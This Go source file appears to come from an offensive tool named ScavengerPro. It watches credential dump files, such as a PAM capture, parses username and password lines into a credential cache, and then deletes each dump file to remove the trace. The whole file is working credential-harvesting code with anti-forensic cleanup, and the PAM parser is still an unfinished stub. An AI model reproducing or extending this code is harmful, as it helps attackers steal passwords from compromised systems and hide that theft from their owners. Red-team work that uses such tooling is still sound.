// watch password dump files, parse them and add them to the cache
// @author: degenerat3

package main

import (
	"ScavengerPro/client/cred_cache"
	"bufio"
	"os"
	"strings"
)

// take file list in form: ["filename:parser" "file2:parser2"...]
func checkFiles(files []string, c *cred_cache.CredCache) {
	for _, f := range files {
		if strings.Contains(f, "def") {
			defaultParse(f, c)
		}
		if strings.Contains(f, "pam") {
			pamParse(f, c)
		}
	}
}

// The default parser, for any log with format:
// TYPE:USER:PASSWORD
func defaultParse(fi string, c *cred_cache.CredCache) []string {
	var res []string
	fname := strings.Split(fi, ":")[0] // get the name of the file to watch
	f, _ := os.Open(fname)
	defer f.Close()
	var lines []string
	scanner := bufio.NewScanner(f) // read the file into a []string
	for scanner.Scan() {
		lines = append(lines, scanner.Text())
	}
	for _, ln := range lines {
		sp := strings.SplitN(ln, ":", 2) // split into user/pass
		typ := "system"
		user := sp[0]
		pass := sp[1]
		fin := typ + ":" + user + ":" + pass // reassemble it
		res = append(res, fin)
		c.AddEntry(fin) // add it to the cache
	}
	os.Remove(fname) // get rid of cred log file
	return nil
}

// For parsing PAM credentail dump (currently using default for it)
func pamParse(f string, c *cred_cache.CredCache) []string {
	//TODO: write the PAM parser
	return nil
}
